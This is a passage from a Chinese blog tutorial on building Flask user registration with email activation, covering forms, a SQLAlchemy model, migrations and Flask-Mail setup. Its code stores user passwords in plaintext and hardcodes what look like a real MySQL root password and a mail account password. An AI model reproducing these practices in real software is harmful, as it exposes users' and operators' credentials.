__name__<span class="token punctuation">,</span> url_prefix<span class="token operator">=</span><span class="token string">'/users'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 设置路由</span>@bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>  render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span>@bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>  render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>@bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/verification/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">verification</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>  render_template<span class="token punctuation">(</span><span class="token string">'verification.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这一步主要用来实现能访问<code>127.0.0.1:5000/users/register/</code>,即实现基本的路由正常.</p></blockquote><h4 id="2-对接数据库"><a href="#2-对接数据库" class="headerlink" title="2.对接数据库"></a>2.对接数据库</h4><blockquote><p>先写<code>register.html</code>,注意,这里我们使用的表单验证是<code>Flask_form</code>,它是提供<code>SECRET_KEY</code>和<code>CSRF</code>保护的,如果已经遗忘的,可以<a href="https://wenyan.online/2020/10/18/flask-csrfd/" target="_blank" rel="noopener">温习</a><code>https://wenyan.online/2020/10/18/flask-csrfd/</code>.</p><p><code>register.html</code></p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>register<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf_token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ csrf_token() }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Email:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Password(again):<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>passwordR<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>agree<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>I agree the policy.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Register<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>exts.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span>  SQLAlchemy<span class="token keyword">from</span> flask_wtf<span class="token punctuation">.</span>csrf <span class="token keyword">import</span> CSRFProtectdb <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span><span class="token punctuation">)</span>csrf <span class="token operator">=</span> CSRFProtect<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>app.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 添加</span><span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token punctuation">,</span>  csrfdb<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span>csrf<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>表单验证比较简单<code>formModel.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm<span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token punctuation">,</span> PasswordField<span class="token punctuation">,</span> BooleanField<span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> Length<span class="token punctuation">,</span> Email<span class="token punctuation">,</span> EqualTo<span class="token keyword">class</span> <span class="token class-name">RegisterForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'长度不够'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    email <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Email<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'长度不够'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    passwordR <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>EqualTo<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    agree <span class="token operator">=</span> BooleanField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 验证为空,默认是False, 选择checkbox 变成True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>做好以上的基本准备后,就可以着手路由和数据库的对应.</p><hr><p>首先,我们来设计一下数据库,它基本满足以下几个内容即可.</p><table><thead><tr><th><code>id</code></th><th><code>username</code></th><th><code>passowrd</code></th><th><code>email</code></th><th><code>verification</code></th><th><code>create_time</code></th><th><code>age</code></th><th><code>phone</code></th></tr></thead><tbody><tr><td>序列号</td><td>用户名</td><td>密码</td><td>邮箱</td><td>是否激活</td><td>创建事件</td><td>年龄</td><td>电话</td></tr></tbody></table><p>为了简便,只是截取前几项</p><p><code>sqlModel.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token keyword">class</span> <span class="token class-name">Users</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'users'</span>    id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    email <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    verification <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Boolean<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># flag,标识是否注册激活</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有了数据库的对应,基本可以创建数据库连接.</p><p><code>config.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 添加</span><span class="token comment" spellcheck="true"># mysql</span><span class="token comment" spellcheck="true"># 数据库支持</span>msg <span class="token operator">=</span> <span class="token string">"mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/flask_mail_demo"</span>SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> msgSQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">False</span> <span class="token comment" spellcheck="true"># 关闭追</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>manage.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_script <span class="token keyword">import</span> Manager<span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token keyword">from</span> flask_migrate <span class="token keyword">import</span> MigrateCommand<span class="token punctuation">,</span> Migrate<span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token comment" spellcheck="true"># 导入Manager并绑定app</span>manager <span class="token operator">=</span> Manager<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 导入flaks_migrate</span><span class="token comment" spellcheck="true"># Migrate 绑定app,db</span>Migrate<span class="token punctuation">(</span>app<span class="token punctuation">,</span> db<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># MigrateCommand 可以使用Alembic的命令</span><span class="token comment" spellcheck="true">#</span>manager<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span><span class="token string">'db'</span><span class="token punctuation">,</span> MigrateCommand<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># db是别名</span><span class="token keyword">if</span> __name__  <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    manager<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用版本控制工具<code>migrate</code></p><pre class="line-numbers language-python"><code class="language-python">$ python manager<span class="token punctuation">.</span>py db <span class="token operator">-</span><span class="token operator">-</span>help   <span class="token comment" spellcheck="true"># 测试数据库连接</span>$ python manager<span class="token punctuation">.</span>py db  init   <span class="token comment" spellcheck="true"># 初始化</span>$ python manager<span class="token punctuation">.</span>py db migratge  <span class="token comment" spellcheck="true"># 生成版本</span>$ python manager<span class="token punctuation">.</span>py db upgrade  <span class="token comment" spellcheck="true"># 升级到最新版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-生成路由"><a href="#3-生成路由" class="headerlink" title="3.生成路由"></a>3.生成路由</h4><blockquote><p>生成注册路由.</p><p><code>dbModel/users.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 设置路由</span>@bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 如果表单验证成功</span>        <span class="token comment" spellcheck="true"># 添加到数据库中</span>        username <span class="token operator">=</span> form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data        email <span class="token operator">=</span> form<span class="token punctuation">.</span>email<span class="token punctuation">.</span>data        password <span class="token operator">=</span> form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data        user <span class="token operator">=</span> Users<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">,</span> email<span class="token operator">=</span>email<span class="token punctuation">,</span> password<span class="token operator">=</span>password<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'users.verification'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>form<span class="token punctuation">.</span>errors<span class="token punctuation">)</span>        <span class="token keyword">return</span>  render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上,是基本的验证表单,并添加到数据库中的过程,但是我们希望的是,再添加到数据库的同时,一并发送邮件给注册账户的邮箱.</p></blockquote><h4 id="4-邮箱设置"><a href="#4-邮箱设置" class="headerlink" title="4.邮箱设置"></a>4.邮箱设置</h4><blockquote><p>修改<code>config.py</code>,设置基本的邮箱信息</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 配置Mail</span>MAIL_SERVER <span class="token operator">=</span> <span class="token string">'smtp.qq.com'</span>MAIL_PORT <span class="token operator">=</span> <span class="token number">465</span>MAIL_USERNAME <span class="token operator">=</span> <span class="token string">'257@qq.com'</span>MAIL_PASSWORD <span class="token operator">=</span> <span class="token string">"imkzuyoomc"</span>MAIL_USE_SSL <span class="token operator">=</span> <span class="token boolean">True</span>MAIL_USE_TLS <span class="token operator">=</span> <span class="token boolean">False</span>MAIL_DEFAULT_SENDER <span class="token operator">=</span> <span class="token string">'257@qq.com'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意,这里使用了<code>MAIL_DEFAULT_SENDER</code>.</p><p>在<code>exts.py</code>文件中引入<code>Flask_mail</code>,并在<code>app.py</code>中绑定<code>app</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token keyword">from</span> bpModel <span class="token keyword">import</span> users<span class="token keyword">import</span> config<span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token punctuation">,</span> mail<span class="token punctuation">,</span> csrfapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span>db<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span>mail<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span>csrf<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>mailModel.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_mail <span class="token keyword">import</span> Message<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span> current_app<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread<span class="token keyword">from</span> exts <span class="token keyword">import</span> mail<span class="token comment" spellcheck="true"># 异步发送邮件</span><span class="token keyword">def</span> <span class="token function">async_send_mail</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 要求在Flask的一次访问中发送邮件,下面代码中新建的线程中并</span>    <span class="token comment" spellcheck="true"># 不包含 上下文结构,手动推送</span>    <span class="token keyword">with</span> app<span class="token punctuation">.</span>app_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        mail<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sendMail</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> subject<span class="token punctuation">,</span> template<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 创建邮件</span>        msg <span class="token operator">=</span> Message<span class="token punctuation">(</span>subject<span class="token punctuation">,</span> recipients<span class="token operator">=</span><span class="token punctuation">[</span>to<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 回传浏览器</span>        msg<span class="token punctuation">.</span>html <span class="token operator">=</span> render_template<span class="token punctuation">(</span>template <span class="token operator">+</span> <span class="token string">'.html'</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 创建一个新线程,发送邮件</span>        <span class="token comment" spellcheck="true"># 根据flask上下文,如果不再同一个 app 中,将无法发送邮件</span>        app <span class="token operator">=</span> current_app<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span>        thread <span class="token operator">=</span> Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>async_send_mail<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span>app<span class="token punctuation">,</span> msg<span class="token punctuation">]</span><span class="token punctuation">)</span>        thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> thread    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里需要注意,我们是在<code>bpModel/users.py</code>下的<code>register</code>中发送邮件,根据<code>flask</code>上下文,它是一个<code>application context(current_app)</code>.如果不在同一个,将不能发送邮件,所以这里手动推送了<code>current_app</code>.它的使用:</p><pre class="line-numbers language-python"><code class="language-python">app_context<span class="token punctuation">(</span><span class="token punctuation">)</span>Binds the application only<span class="token punctuation">.</span> For <span class="token keyword">as</span> long <span class="token keyword">as</span> the application <span class="token keyword">is</span> bound to the current context the flask<span class="token punctuation">.</span>current_app points to that application<span class="token punctuation">.</span> An application context <span class="token keyword">is</span> automatically created when a request context <span class="token keyword">is</span> pushed <span class="token keyword">if</span> necessary<span class="token punctuation">.</span>Example usage<span class="token punctuation">:</span><span class="token keyword">with</span> app<span class="token punctuation">.</span>app_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再次修改<code>register</code>路由,发送邮件</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 设置路由</span>@bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 如果表单验证成功</span>        <span class="token comment" spellcheck="true"># 添加到数据库中</span>        username <span class="token operator">=</span> form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data        email <span class="token operator">=</span> form<span class="token punctuation">.</span>email<span class="token punctuation">.</span>data        password <span class="token operator">=</span> form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data        user <span class="token operator">=</span> Users<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">,</span> email<span class="token operator">=</span>email<span class="token punctuation">,</span> password<span class="token operator">=</span>password<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 生成激活校验的token</span>        token <span class="token operator">=</span> user<span class="token punctuation">.</span>generate_active_token<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 发送激活邮件到注册邮箱</span>        sendMail<span class="token punctuation">(</span>user<span class="token punctuation">.</span>email<span class="token punctuation">,</span> <span class="token string">'账户激活'</span><span class="token punctuation">,</span> <span class="token string">'activate'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>user<span class="token punctuation">.</span>username<span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token 